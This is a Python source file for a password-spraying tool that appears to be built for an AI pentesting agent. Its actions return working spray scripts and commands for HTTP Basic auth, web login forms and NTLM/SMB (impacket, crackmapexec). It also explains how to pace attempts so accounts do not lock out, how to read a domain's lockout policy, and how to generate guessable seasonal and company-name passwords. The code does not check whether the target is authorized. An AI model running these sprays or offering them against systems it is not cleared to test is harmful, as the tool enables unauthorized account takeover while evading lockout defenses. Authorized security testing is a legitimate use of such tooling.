"""Password spraying tool for various authentication protocols."""

from typing import Any, Literal

from strix.tools.registry import register_tool
from strix.tools.validation import (
    generate_usage_hint,
    validate_action_param,
    validate_required_param,
    validate_unknown_params,
)

ToolAction = Literal[
    "spray_http_basic",
    "spray_http_form",
    "spray_ntlm",
    "check_lockout",
    "generate_passwords",
]


@register_tool(sandbox_execution=True)
def password_sprayer(
    action: ToolAction,
    target: str | None = None,
    usernames: list[str] | None = None,
    username_file: str | None = None,
    password: str | None = None,
    passwords: list[str] | None = None,
    endpoint: str | None = None,
    domain: str | None = None,
    delay_seconds: int | None = None,
    username_field: str | None = None,
    password_field: str | None = None,
    company_name: str | None = None,
    year: int | None = None,
    **kwargs: Any,
) -> dict[str, Any] | str:
    """Password spraying tool for testing authentication.

    Args:
        action: The action to perform
        target: Target URL or host
        usernames: List of usernames to test
        username_file: Path to file containing usernames
        password: Single password to spray
        passwords: List of passwords to spray
        endpoint: Authentication endpoint path
        domain: Domain for NTLM auth
        delay_seconds: Delay between attempts (lockout avoidance)
        username_field: Form field name for username
        password_field: Form field name for password
        company_name: Company name for password generation
        year: Year for password generation

    Returns:
        Results dict or error message
    """
    VALID_PARAMS = {
        "action", "target", "usernames", "username_file", "password",
        "passwords", "endpoint", "domain", "delay_seconds",
        "username_field", "password_field", "company_name", "year",
    }
    VALID_ACTIONS = [
        "spray_http_basic",
        "spray_http_form",
        "spray_ntlm",
        "check_lockout",
        "generate_passwords",
    ]

    if unknown_error := validate_unknown_params(kwargs, VALID_PARAMS, "password_sprayer"):
        return unknown_error

    if action_error := validate_action_param(action, VALID_ACTIONS, "password_sprayer"):
        return action_error

    if action == "spray_http_basic":
        if param_error := validate_required_param(target, "target", action, "password_sprayer"):
            return param_error

        user_list = usernames or []
        pass_list = [password] if password else (passwords or [])

        return {
            "action": "spray_http_basic",
            "target": target,
            "configuration": {
                "usernames_count": len(user_list),
                "passwords_count": len(pass_list),
                "delay_seconds": delay_seconds or 0,
            },
            "methodology": [
                "1. For each password in the list:",
                "   - Attempt login with each username",
                "   - Wait delay_seconds between usernames",
                "2. Record successful authentications",
                "3. Track failed attempts for lockout awareness",
            ],
            "curl_command": f'curl -u "username:password" {target}',
            "python_example": f'''
import requests
import time
from requests.auth import HTTPBasicAuth

target = "{target}"
usernames = {user_list[:5]}  # First 5 shown
passwords = {pass_list[:3]}  # First 3 shown
delay = {delay_seconds or 0}

for password in passwords:
    for username in usernames:
        try:
            response = requests.get(target, auth=HTTPBasicAuth(username, password), timeout=10)
            if response.status_code == 200:
                print(f"[+] SUCCESS: {{username}}:{{password}}")
            time.sleep(delay)
        except Exception as e:
            print(f"[-] Error: {{e}}")
''',
            "important_notes": [
                "Use delay to avoid account lockouts",
                "Default lockout: 5-10 failed attempts in 30 mins",
                "Consider using 1 password across all users, then rotate",
            ],
        }

    elif action == "spray_http_form":
        if param_error := validate_required_param(target, "target", action, "password_sprayer"):
            return param_error

        user_field = username_field or "username"
        pass_field = password_field or "password"
        login_endpoint = endpoint or "/login"

        return {
            "action": "spray_http_form",
            "target": target,
            "endpoint": login_endpoint,
            "configuration": {
                "username_field": user_field,
                "password_field": pass_field,
                "delay_seconds": delay_seconds or 0,
            },
            "curl_command": f'curl -X POST {target}{login_endpoint} -d "{user_field}=user&{pass_field}=password"',
            "python_example": f'''
import requests
import time

target = "{target}{login_endpoint}"
usernames = ["admin", "user", "test"]
password = "Password123!"

for username in usernames:
    data = {{
        "{user_field}": username,
        "{pass_field}": password
    }}
    try:
        response = requests.post(target, data=data, allow_redirects=False)
        # Check for success indicators
        if response.status_code in [200, 302] and "invalid" not in response.text.lower():
            print(f"[+] Possible success: {{username}}")
        time.sleep({delay_seconds or 1})
    except Exception as e:
        print(f"[-] Error: {{e}}")
''',
            "detection_methods": [
                "Check for redirect to dashboard/home (302)",
                "Look for Set-Cookie headers",
                "Check response body for welcome messages",
                "Monitor for absence of 'invalid' or 'failed' text",
            ],
        }

    elif action == "spray_ntlm":
        if param_error := validate_required_param(target, "target", action, "password_sprayer"):
            return param_error

        return {
            "action": "spray_ntlm",
            "target": target,
            "domain": domain or "WORKGROUP",
            "methodology": [
                "Use NTLM authentication against target",
                "Common NTLM endpoints: SMB (445), HTTP (NTLM), LDAP (389)",
            ],
            "python_example": f'''
from impacket.smbconnection import SMBConnection

target = "{target}"
domain = "{domain or 'WORKGROUP'}"
usernames = ["administrator", "admin", "user"]
password = "Password123!"

for username in usernames:
    try:
        conn = SMBConnection(target, target, timeout=5)
        conn.login(username, password, domain)
        print(f"[+] SUCCESS: {{domain}}\\\\{{username}}:{{password}}")
        conn.close()
    except Exception as e:
        if "STATUS_LOGON_FAILURE" not in str(e):
            print(f"[!] Unexpected error for {{username}}: {{e}}")
''',
            "crackmapexec_command": f'crackmapexec smb {target} -u users.txt -p "Password123!" -d {domain or "WORKGROUP"}',
            "lockout_warning": "Domain policies often lock after 5-10 failed attempts. Check policy first!",
        }

    elif action == "check_lockout":
        if param_error := validate_required_param(target, "target", action, "password_sprayer"):
            return param_error

        return {
            "action": "check_lockout",
            "target": target,
            "methodology": [
                "1. Query domain for lockout policy",
                "2. Check threshold and observation window",
                "3. Calculate safe spray rate",
            ],
            "ldap_query": '''
# Using ldapsearch
ldapsearch -x -H ldap://DC -D "user@domain" -W -b "DC=domain,DC=com" \
    "(objectClass=domain)" lockoutThreshold lockoutDuration lockoutObservationWindow

# Using PowerShell
Get-ADDefaultDomainPasswordPolicy
''',
            "common_policies": [
                {"description": "Strict", "threshold": 3, "duration_mins": 30},
                {"description": "Standard", "threshold": 5, "duration_mins": 30},
                {"description": "Lenient", "threshold": 10, "duration_mins": 15},
            ],
            "safe_spray_calculation": "If threshold=5, duration=30min: max 4 attempts per user per 30 min",
        }

    elif action == "generate_passwords":
        company = company_name or "Company"
        current_year = year or 2024

        passwords_list = [
            f"{company}{current_year}!",
            f"{company}{current_year}",
            f"{company}@{current_year}",
            f"{company.lower()}{current_year}!",
            f"{company.capitalize()}123!",
            f"{company.capitalize()}123",
            "Password123!",
            "Welcome1!",
            f"Winter{current_year}!",
            f"Summer{current_year}!",
            f"Spring{current_year}!",
            f"Fall{current_year}!",
            f"{current_year}{company}!",
            f"P@ssw0rd{current_year}",
            "Changeme1!",
            "Letmein123!",
        ]

        return {
            "action": "generate_passwords",
            "company_name": company,
            "year": current_year,
            "generated_passwords": passwords_list,
            "patterns_used": [
                "Company + Year + Special char",
                "Seasonal + Year + Special char",
                "Common defaults (Password123!, Welcome1!)",
                "Variations in capitalization",
            ],
            "recommendations": [
                "Start with seasonal passwords (current season + year)",
                "Try company name variations",
                "Use single password across all users first",
                "Respect lockout thresholds",
            ],
        }

    return generate_usage_hint("password_sprayer", VALID_ACTIONS)
